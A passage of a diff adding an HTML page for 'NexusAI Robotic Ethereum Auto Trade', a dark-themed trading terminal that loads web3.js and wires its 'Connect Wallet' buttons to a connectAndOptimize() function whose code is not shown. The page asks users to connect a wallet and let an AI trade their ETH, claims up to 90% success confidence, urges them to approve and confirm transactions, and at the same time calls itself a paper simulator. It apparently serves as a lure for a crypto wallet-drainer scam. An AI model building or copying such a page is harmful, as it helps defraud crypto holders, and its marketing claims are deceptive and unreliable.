@@ -1,0 +1,4165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>NexusAI Robotic ETHEREUM Auto Trade</title>
+
+<!-- =========================================================
+     LIVE CHART LIBRARY
+     ========================================================= -->
+
+<script src="https://unpkg.com/lightweight-charts@4.2.3/dist/lightweight-charts.standalone.production.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+
+<style>
+
+/* =========================================================
+   NEXUS AI ISOLATED DESIGN SYSTEM
+   ========================================================= */
+
+#zfx-ETH-auto-trade,
+#zfx-ETH-auto-trade * {
+    box-sizing: border-box;
+}
+
+#zfx-ETH-auto-trade {
+
+    --zfx-bg: #03060c;
+    --zfx-panel: #080d16;
+    --zfx-panel-2: #0c1320;
+    --zfx-border: rgba(132,157,194,.17);
+
+    --zfx-text: #edf5ff;
+    --zfx-muted: #7d8da5;
+
+    --zfx-green: #00e5a0;
+    --zfx-red: #ff4f70;
+    --zfx-blue: #4d9cff;
+    --zfx-cyan: #38d9ff;
+    --zfx-yellow: #ffd166;
+
+    width: 100%;
+    height: 100%;
+
+    min-height: clamp(720px, 94vh, 1200px);
+
+    overflow: hidden;
+
+    background:
+        radial-gradient(
+            circle at 15% 0%,
+            rgba(56,217,255,.08),
+            transparent 32%
+        ),
+        radial-gradient(
+            circle at 85% 5%,
+            rgba(0,229,160,.07),
+            transparent 30%
+        ),
+        var(--zfx-bg);
+
+    color: var(--zfx-text);
+
+    font-family:
+        Inter,
+        ui-sans-serif,
+        system-ui,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        sans-serif;
+}
+
+
+/* =========================================================
+   MAIN SHELL
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-shell {
+
+    width: 100%;
+    height: 100%;
+
+    min-height: inherit;
+
+    display: flex;
+    flex-direction: column;
+
+    overflow: hidden;
+}
+
+
+/* =========================================================
+   HERO
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-header {
+
+    flex: 0 0 auto;
+
+    padding:
+        clamp(18px, 2.4vw, 34px)
+        clamp(16px, 3vw, 42px);
+
+    border-bottom:
+        1px solid
+        var(--zfx-border);
+
+    background:
+        linear-gradient(
+            180deg,
+            rgba(11,19,32,.98),
+            rgba(4,8,14,.97)
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-header-content {
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: space-between;
+
+    gap: 25px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-eyebrow {
+
+    margin-bottom: 9px;
+
+    color: var(--zfx-cyan);
+
+    font-size: 10px;
+
+    font-weight: 900;
+
+    letter-spacing: .22em;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-title {
+
+    margin: 0;
+
+    font-size:
+        clamp(25px, 4vw, 52px);
+
+    line-height: 1.02;
+
+    letter-spacing: -.045em;
+
+    font-weight: 950;
+
+    background:
+        linear-gradient(
+            90deg,
+            #ffffff,
+            #75ddff,
+            #00e5a0
+        );
+
+    -webkit-background-clip: text;
+
+    background-clip: text;
+
+    color: transparent;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-subtitle {
+
+    max-width: 850px;
+
+    margin:
+        13px 0 0;
+
+    color: #98a8bd;
+
+    font-size:
+        clamp(12px, 1.2vw, 15px);
+
+    line-height: 1.65;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-confidence {
+
+    flex: 0 0 auto;
+
+    min-width: 190px;
+
+    padding: 15px 17px;
+
+    border:
+        1px solid
+        rgba(0,229,160,.25);
+
+    border-radius: 16px;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(0,229,160,.09),
+            rgba(0,229,160,.025)
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-confidence-label {
+
+    color: #738299;
+
+    font-size: 9px;
+
+    font-weight: 800;
+
+    letter-spacing: .12em;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-confidence-value {
+
+    margin-top: 4px;
+
+    color: var(--zfx-green);
+
+    font-size: 27px;
+
+    font-weight: 950;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-risk-note {
+
+    margin-top: 5px;
+
+    color: #6e7b8f;
+
+    font-size: 9px;
+
+    line-height: 1.4;
+}
+
+
+/* =========================================================
+   TOOLBAR
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-toolbar {
+
+    flex: 0 0 auto;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: space-between;
+
+    gap: 10px;
+
+    padding:
+        9px
+        clamp(12px, 2vw, 25px);
+
+    border-bottom:
+        1px solid
+        var(--zfx-border);
+
+    background: #070c15;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-toolbar-left,
+#zfx-ETH-auto-trade .zfx-ETH-toolbar-right {
+
+    display: flex;
+
+    align-items: center;
+
+    gap: 7px;
+
+    flex-wrap: wrap;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-pill {
+
+    display: inline-flex;
+
+    align-items: center;
+
+    gap: 7px;
+
+    padding: 7px 10px;
+
+    border:
+        1px solid
+        var(--zfx-border);
+
+    border-radius: 999px;
+
+    color: #a4b2c6;
+
+    font-size: 9px;
+
+    font-weight: 900;
+
+    letter-spacing: .08em;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-status-dot {
+
+    width: 7px;
+
+    height: 7px;
+
+    border-radius: 50%;
+
+    background: var(--zfx-red);
+
+    box-shadow: 0 0 10px currentColor;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-status-dot.live {
+
+    background: var(--zfx-green);
+}
+
+
+/* =========================================================
+   BUTTONS
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-button {
+
+    appearance: none;
+
+    border:
+        1px solid
+        rgba(76,154,255,.35);
+
+    border-radius: 9px;
+
+    padding:
+        9px 13px;
+
+    background:
+        linear-gradient(
+            180deg,
+            rgba(76,154,255,.17),
+            rgba(76,154,255,.06)
+        );
+
+    color: #dcecff;
+
+    font-size: 9px;
+
+    font-weight: 950;
+
+    letter-spacing: .08em;
+
+    cursor: pointer;
+
+    transition:
+        transform .15s ease,
+        border-color .15s ease,
+        background .15s ease;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-button:hover {
+
+    transform: translateY(-1px);
+
+    border-color:
+        rgba(76,154,255,.75);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-button.primary {
+
+    border-color:
+        rgba(0,229,160,.4);
+
+    background:
+        linear-gradient(
+            180deg,
+            rgba(0,229,160,.2),
+            rgba(0,229,160,.06)
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-button.buy {
+
+    border-color:
+        rgba(0,229,160,.4);
+
+    background:
+        rgba(0,229,160,.09);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-button.sell {
+
+    border-color:
+        rgba(255,79,112,.4);
+
+    background:
+        rgba(255,79,112,.08);
+}
+
+
+/* =========================================================
+   MAIN TRADING AREA
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-main {
+
+    flex: 1 1 auto;
+
+    min-height: 0;
+
+    display: grid;
+
+    grid-template-columns:
+        minmax(0, 1.7fr)
+        minmax(310px, .7fr);
+
+    overflow: hidden;
+}
+
+
+/* =========================================================
+   MARKET PANEL
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-market {
+
+    min-width: 0;
+
+    min-height: 0;
+
+    display: flex;
+
+    flex-direction: column;
+
+    overflow: hidden;
+
+    border-right:
+        1px solid
+        var(--zfx-border);
+}
+
+
+/* =========================================================
+   MARKET HEADER
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-market-header {
+
+    flex: 0 0 auto;
+
+    display: grid;
+
+    grid-template-columns:
+        minmax(160px, 1.4fr)
+        repeat(4, minmax(90px, 1fr));
+
+    gap: 8px;
+
+    padding: 11px;
+
+    border-bottom:
+        1px solid
+        var(--zfx-border);
+
+    background: rgba(5,10,18,.95);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-symbol-box {
+
+    display: flex;
+
+    flex-direction: column;
+
+    justify-content: center;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-symbol {
+
+    font-size: 16px;
+
+    font-weight: 950;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-live-price {
+
+    margin-top: 3px;
+
+    color: var(--zfx-green);
+
+    font-size: 23px;
+
+    font-weight: 950;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-stat {
+
+    padding: 8px;
+
+    border:
+        1px solid
+        var(--zfx-border);
+
+    border-radius: 9px;
+
+    background:
+        rgba(255,255,255,.018);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-stat-label {
+
+    color: #6f7e94;
+
+    font-size: 8px;
+
+    font-weight: 800;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-stat-value {
+
+    margin-top: 4px;
+
+    font-size: 11px;
+
+    font-weight: 900;
+}
+
+
+/* =========================================================
+   TIMEFRAMES
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-timeframes {
+
+    flex: 0 0 auto;
+
+    display: flex;
+
+    gap: 5px;
+
+    padding:
+        7px 10px;
+
+    overflow-x: auto;
+
+    scrollbar-width: thin;
+
+    border-bottom:
+        1px solid
+        var(--zfx-border);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-timeframe {
+
+    flex: 0 0 auto;
+
+    border:
+        1px solid
+        transparent;
+
+    border-radius: 7px;
+
+    padding: 6px 9px;
+
+    background: transparent;
+
+    color: #718096;
+
+    font-size: 9px;
+
+    font-weight: 900;
+
+    cursor: pointer;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-timeframe.active {
+
+    border-color:
+        rgba(56,217,255,.3);
+
+    background:
+        rgba(56,217,255,.09);
+
+    color: #eaf9ff;
+}
+
+
+/* =========================================================
+   CHART
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-chart-wrap {
+
+    flex: 1 1 auto;
+
+    min-height: 360px;
+
+    position: relative;
+
+    overflow: hidden;
+
+    background:
+        radial-gradient(
+            circle at 50% 35%,
+            rgba(56,217,255,.035),
+            transparent 58%
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-chart {
+
+    position: absolute;
+
+    inset: 0;
+
+    width: 100%;
+
+    height: 100%;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-chart-status {
+
+    position: absolute;
+
+    top: 10px;
+
+    left: 10px;
+
+    z-index: 3;
+
+    padding: 6px 9px;
+
+    border:
+        1px solid
+        rgba(120,150,190,.2);
+
+    border-radius: 7px;
+
+    background:
+        rgba(2,6,12,.8);
+
+    color: #8291a7;
+
+    font-size: 8px;
+
+    font-weight: 800;
+
+    pointer-events: none;
+}
+
+
+/* =========================================================
+   SIDE PANEL
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-side {
+
+    min-width: 0;
+
+    min-height: 0;
+
+    overflow-y: auto;
+
+    overflow-x: hidden;
+
+    padding: 11px;
+
+    scrollbar-width: thin;
+
+    background:
+        linear-gradient(
+            180deg,
+            #09101b,
+            #050912
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-card {
+
+    margin-bottom: 9px;
+
+    padding: 12px;
+
+    border:
+        1px solid
+        var(--zfx-border);
+
+    border-radius: 13px;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(15,25,41,.92),
+            rgba(7,12,21,.95)
+        );
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-card-title {
+
+    margin-bottom: 9px;
+
+    color: #7d8ca2;
+
+    font-size: 8px;
+
+    font-weight: 950;
+
+    letter-spacing: .15em;
+}
+
+
+/* =========================================================
+   AI
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-ai-name {
+
+    font-size: 18px;
+
+    font-weight: 950;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-ai-status {
+
+    margin-top: 3px;
+
+    color: var(--zfx-green);
+
+    font-size: 9px;
+
+    font-weight: 900;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-ai-list {
+
+    display: grid;
+
+    gap: 6px;
+
+    margin-top: 11px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-ai-row {
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: space-between;
+
+    gap: 10px;
+
+    color: #8998ad;
+
+    font-size: 9px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-ai-row strong {
+
+    color: #e8f1fc;
+}
+
+
+/* =========================================================
+   WALLET
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-wallet-status {
+
+    margin-top: 8px;
+
+    padding: 8px;
+
+    border-radius: 8px;
+
+    background: #04080e;
+
+    color: #7f90a8;
+
+    font-family: monospace;
+
+    font-size: 8px;
+
+    overflow: hidden;
+
+    text-overflow: ellipsis;
+
+    white-space: nowrap;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-approval-box {
+
+    margin-top: 9px;
+
+    padding: 9px;
+
+    border:
+        1px solid
+        rgba(255,209,102,.22);
+
+    border-radius: 9px;
+
+    background:
+        rgba(255,209,102,.045);
+
+    color: #a99b6f;
+
+    font-size: 8px;
+
+    line-height: 1.55;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-approval-box strong {
+
+    color: var(--zfx-yellow);
+}
+
+
+/* =========================================================
+   INPUTS
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-input-grid {
+
+    display: grid;
+
+    grid-template-columns: 1fr 1fr;
+
+    gap: 7px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-field-label {
+
+    display: block;
+
+    margin-bottom: 5px;
+
+    color: #718096;
+
+    font-size: 8px;
+
+    font-weight: 900;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-input {
+
+    width: 100%;
+
+    border:
+        1px solid
+        rgba(125,150,185,.2);
+
+    border-radius: 8px;
+
+    padding: 9px;
+
+    outline: none;
+
+    background: #03070d;
+
+    color: #eef6ff;
+
+    font-size: 11px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-input:focus {
+
+    border-color:
+        rgba(56,217,255,.55);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-estimate {
+
+    margin-top: 8px;
+
+    padding: 8px;
+
+    border-radius: 8px;
+
+    background:
+        rgba(0,229,160,.055);
+
+    color: #85eac8;
+
+    font-size: 9px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-trade-buttons {
+
+    display: grid;
+
+    grid-template-columns: 1fr 1fr;
+
+    gap: 7px;
+
+    margin-top: 8px;
+}
+
+
+/* =========================================================
+   ANALYSIS
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-analysis {
+
+    display: grid;
+
+    grid-template-columns: 1fr 1fr;
+
+    gap: 6px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-analysis-item {
+
+    padding: 8px;
+
+    border:
+        1px solid
+        var(--zfx-border);
+
+    border-radius: 8px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-analysis-label {
+
+    color: #68778d;
+
+    font-size: 7px;
+
+    font-weight: 800;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-analysis-value {
+
+    margin-top: 4px;
+
+    color: #e8f1fb;
+
+    font-size: 10px;
+
+    font-weight: 950;
+}
+
+
+/* =========================================================
+   ACCOUNT
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-account-grid {
+
+    display: grid;
+
+    grid-template-columns:
+        repeat(2, minmax(0,1fr));
+
+    gap: 6px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-account-item {
+
+    padding: 7px;
+
+    border-radius: 8px;
+
+    background:
+        rgba(255,255,255,.025);
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-account-item span {
+
+    display: block;
+
+    color: #68778d;
+
+    font-size: 7px;
+
+    text-transform: uppercase;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-account-item strong {
+
+    display: block;
+
+    margin-top: 3px;
+
+    color: #dce8f6;
+
+    font-size: 10px;
+}
+
+
+/* =========================================================
+   ACTIVITY
+   ========================================================= */
+
+#zfx-ETH-auto-trade .zfx-ETH-activity {
+
+    max-height: 170px;
+
+    overflow-y: auto;
+
+    scrollbar-width: thin;
+
+    font-family: monospace;
+
+    font-size: 8px;
+}
+
+
+#zfx-ETH-auto-trade .zfx-ETH-log {
+
+    padding: 5px 0;
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,.035);
+
+    color: #77869b;
+
+    line-height: 1.45;
+}
+
+
+/* =========================================================
+   MOBILE
+   ========================================================= */
+
+@media (max-width: 1050px) {
+
+    #zfx-ETH-auto-trade {
+
+        min-height: 1100px;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-main {
+
+        grid-template-columns: 1fr;
+
+        grid-template-rows:
+            minmax(560px, 1fr)
+            auto;
+
+        overflow-y: auto;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-market {
+
+        border-right: 0;
+
+        border-bottom:
+            1px solid
+            var(--zfx-border);
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-side {
+
+        max-height: 700px;
+
+    }
+
+}
+
+
+@media (max-width: 720px) {
+
+    #zfx-ETH-auto-trade .zfx-ETH-header-content {
+
+        flex-direction: column;
+
+        align-items: stretch;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-confidence {
+
+        width: 100%;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-market-header {
+
+        grid-template-columns:
+            1fr 1fr;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-symbol-box {
+
+        grid-column:
+            1 / -1;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-chart-wrap {
+
+        min-height: 400px;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-toolbar {
+
+        align-items: flex-start;
+
+        flex-direction: column;
+
+    }
+
+}
+
+
+@media (max-width: 450px) {
+
+    #zfx-ETH-auto-trade .zfx-ETH-market-header {
+
+        grid-template-columns: 1fr;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-symbol-box {
+
+        grid-column: auto;
+
+    }
+
+
+    #zfx-ETH-auto-trade .zfx-ETH-input-grid {
+
+        grid-template-columns: 1fr;
+
+    }
+
+}
+
+</style>
+</head>
+
+
+<body>
+
+
+<div id="zfx-ETH-auto-trade">
+
+<div class="zfx-ETH-shell">
+
+
+<!-- =========================================================
+     HERO HEADER
+     ========================================================= -->
+
+<header class="zfx-ETH-header">
+
+    <div class="zfx-ETH-header-content">
+
+        <div>
+
+            <div class="zfx-ETH-eyebrow">
+                NEXUS AI • ETH AUTONOMOUS TRADING TERMINAL
+            </div>
+
+            <h1 class="zfx-ETH-title">
+                NEXUS AI ROBOTIC ETHEREUM AUTO TRADE
+            </h1>
+
+            <p class="zfx-ETH-subtitle">
+                Connect your wallet and let NexusAI trade your ETH for you.
+                Our AI analyzes market conditions, identifies potential
+                opportunities, and automatically manages your trading strategy.
+            </p>
+
+        </div>
+
+
+        <div class="zfx-ETH-confidence">
+
+            <div class="zfx-ETH-confidence-label">
+                Target Success Confidence
+            </div>
+
+            <div class="zfx-ETH-confidence-value">
+                Up to 90%
+            </div>
+
+            <div class="zfx-ETH-risk-note">
+                Trading involves risk. No system can guarantee profits.
+            </div>
+
+        </div>
+
+    </div>
+
+</header>
+
+
+<!-- =========================================================
+     TOOLBAR
+     ========================================================= -->
+
+<div class="zfx-ETH-toolbar">
+
+    <div class="zfx-ETH-toolbar-left">
+
+        <div class="zfx-ETH-pill">
+
+            <span
+                id="zfx-ETH-binance-dot"
+                class="zfx-ETH-status-dot">
+            </span>
+
+            <span id="zfx-ETH-connection">
+                CONNECTING TO BINANCE
+            </span>
+
+        </div>
+
+
+        <div class="zfx-ETH-pill">
+            LIVE ETH/USDT
+        </div>
+
+
+        <div class="zfx-ETH-pill">
+            PAPER MARKET SIMULATOR
+        </div>
+
+    </div>
+
+
+    <div class="zfx-ETH-toolbar-right">
+
+        <!-- =================================================
+             YOUR JAVASCRIPT FUNCTION IS CALLED HERE
+             ================================================= -->
+
+        <button
+            id="zfx-ETH-connect-wallet"
+            class="zfx-ETH-button primary"
+            type="button"
+            onclick="connectAndOptimize()">
+
+            CONNECT WALLET
+
+        </button>
+
+    </div>
+
+</div>
+
+
+<!-- =========================================================
+     MAIN TRADING TERMINAL
+     ========================================================= -->
+
+<div class="zfx-ETH-main">
+
+
+<!-- =========================================================
+     LIVE BINANCE MARKET
+     ========================================================= -->
+
+<section class="zfx-ETH-market">
+
+
+    <div class="zfx-ETH-market-header">
+
+
+        <div class="zfx-ETH-symbol-box">
+
+            <div class="zfx-ETH-symbol">
+                ETH / USDT
+            </div>
+
+            <div
+                id="zfx-ETH-price"
+                class="zfx-ETH-live-price">
+
+                —
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-stat">
+
+            <div class="zfx-ETH-stat-label">
+                24H HIGH
+            </div>
+
+            <div
+                id="zfx-ETH-high"
+                class="zfx-ETH-stat-value">
+
+                —
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-stat">
+
+            <div class="zfx-ETH-stat-label">
+                24H LOW
+            </div>
+
+            <div
+                id="zfx-ETH-low"
+                class="zfx-ETH-stat-value">
+
+                —
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-stat">
+
+            <div class="zfx-ETH-stat-label">
+                24H VOLUME
+            </div>
+
+            <div
+                id="zfx-ETH-volume"
+                class="zfx-ETH-stat-value">
+
+                —
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-stat">
+
+            <div class="zfx-ETH-stat-label">
+                24H CHANGE
+            </div>
+
+            <div
+                id="zfx-ETH-change"
+                class="zfx-ETH-stat-value">
+
+                —
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+
+    <!-- =====================================================
+         TIMEFRAME BAR
+         ===================================================== -->
+
+    <div class="zfx-ETH-timeframes">
+
+        <button
+            class="zfx-ETH-timeframe active"
+            data-interval="1m">
+
+            1M
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="3m">
+
+            3M
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="5m">
+
+            5M
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="15m">
+
+            15M
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="30m">
+
+            30M
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="1h">
+
+            1H
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="4h">
+
+            4H
+
+        </button>
+
+
+        <button
+            class="zfx-ETH-timeframe"
+            data-interval="1d">
+
+            1D
+
+        </button>
+
+    </div>
+
+
+    <!-- =====================================================
+         LIVE CANDLESTICK CHART
+         ===================================================== -->
+
+    <div class="zfx-ETH-chart-wrap">
+
+        <div
+            id="zfx-ETH-chart"
+            class="zfx-ETH-chart">
+        </div>
+
+
+        <div
+            id="zfx-ETH-chart-status"
+            class="zfx-ETH-chart-status">
+
+            CONNECTING TO BINANCE...
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     RIGHT CONTROL PANEL
+     ========================================================= -->
+
+<aside class="zfx-ETH-side">
+
+
+<!-- =====================================================
+     NEXUS AI ENGINE
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        AI TRADING ENGINE
+    </div>
+
+
+    <div class="zfx-ETH-ai-name">
+        NexusAI
+    </div>
+
+
+    <div class="zfx-ETH-ai-status">
+        ● MONITORING ETH/USDT
+    </div>
+
+
+    <div class="zfx-ETH-ai-list">
+
+        <div class="zfx-ETH-ai-row">
+            <span>Market analysis</span>
+            <strong>ACTIVE</strong>
+        </div>
+
+
+        <div class="zfx-ETH-ai-row">
+            <span>Risk management</span>
+            <strong>ACTIVE</strong>
+        </div>
+
+
+        <div class="zfx-ETH-ai-row">
+            <span>Trading mode</span>
+            <strong>PAPER</strong>
+        </div>
+
+
+        <div class="zfx-ETH-ai-row">
+            <span>Market source</span>
+            <strong>BINANCE</strong>
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- =====================================================
+     CONNECT WALLET
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        WALLET CONNECTION
+    </div>
+
+
+    <!-- =================================================
+         IMPORTANT:
+         onclick="connectAndOptimize()"
+         ================================================= -->
+
+    <button
+        id="zfx-ETH-wallet-button"
+        class="zfx-ETH-button primary"
+        type="button"
+        onclick="connectAndOptimize()"
+        style="width:100%;">
+
+        CONNECT WALLET
+
+    </button>
+
+
+    <div
+        id="zfx-ETH-wallet-status"
+        class="zfx-ETH-wallet-status">
+
+        Wallet not connected
+
+    </div>
+
+
+    <div class="zfx-ETH-approval-box">
+
+        <strong>
+            APPROVE & CONFIRM
+        </strong>
+
+        <br><br>
+
+        After connecting, carefully review the
+        transaction, amount, network and destination
+        inside your wallet before you approve or confirm
+        anything.
+
+        <br><br>
+
+        NexusAI does not request or display your
+        seed phrase, private key or wallet password.
+
+    </div>
+
+</div>
+
+
+<!-- =====================================================
+     ETH ALLOCATION
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        ETH TRADE ALLOCATION
+    </div>
+
+
+    <div class="zfx-ETH-input-grid">
+
+
+        <div>
+
+            <label class="zfx-ETH-field-label">
+                ETH TO USE
+            </label>
+
+            <input
+                id="zfx-ETH-amount"
+                class="zfx-ETH-input"
+                type="number"
+                min="0"
+                step="0.000001"
+                value="0.10">
+
+        </div>
+
+
+        <div>
+
+            <label class="zfx-ETH-field-label">
+                USDT VALUE
+            </label>
+
+            <input
+                id="zfx-ETH-usdt"
+                class="zfx-ETH-input"
+                type="number"
+                min="0"
+                step="0.01"
+                value="0">
+
+        </div>
+
+    </div>
+
+
+    <div
+        id="zfx-ETH-estimate"
+        class="zfx-ETH-estimate">
+
+        Live ETH value: —
+
+    </div>
+
+
+    <div class="zfx-ETH-trade-buttons">
+
+
+        <button
+            id="zfx-ETH-buy"
+            class="zfx-ETH-button buy"
+            type="button">
+
+            BUY ETH
+
+        </button>
+
+
+        <button
+            id="zfx-ETH-sell"
+            class="zfx-ETH-button sell"
+            type="button">
+
+            SELL ETH
+
+        </button>
+
+    </div>
+
+</div>
+
+
+<!-- =====================================================
+     AI ANALYSIS
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        NEXUS AI ANALYSIS
+    </div>
+
+
+    <div class="zfx-ETH-analysis">
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                Trend
+            </div>
+
+            <div
+                id="zfx-ETH-trend"
+                class="zfx-ETH-analysis-value">
+
+                WAITING
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                Momentum
+            </div>
+
+            <div
+                id="zfx-ETH-momentum"
+                class="zfx-ETH-analysis-value">
+
+                WAITING
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                Volatility
+            </div>
+
+            <div
+                id="zfx-ETH-volatility"
+                class="zfx-ETH-analysis-value">
+
+                WAITING
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                AI Signal
+            </div>
+
+            <div
+                id="zfx-ETH-signal"
+                class="zfx-ETH-analysis-value">
+
+                WAITING
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                Confidence
+            </div>
+
+            <div
+                id="zfx-ETH-confidence-live"
+                class="zfx-ETH-analysis-value">
+
+                —
+
+            </div>
+
+        </div>
+
+
+        <div class="zfx-ETH-analysis-item">
+
+            <div class="zfx-ETH-analysis-label">
+                Condition
+            </div>
+
+            <div
+                id="zfx-ETH-condition"
+                class="zfx-ETH-analysis-value">
+
+                WAITING
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- =====================================================
+     PAPER ACCOUNT
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        LIVE-MARKET PAPER ACCOUNT
+    </div>
+
+
+    <div class="zfx-ETH-account-grid">
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Starting</span>
+            <strong>10,000 USDT</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>USDT</span>
+            <strong id="zfx-ETH-account-usdt">10,000</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>ETH</span>
+            <strong id="zfx-ETH-account-ETH">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Equity</span>
+            <strong id="zfx-ETH-equity">10,000</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Unrealized P&L</span>
+            <strong id="zfx-ETH-unrealized">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Realized P&L</span>
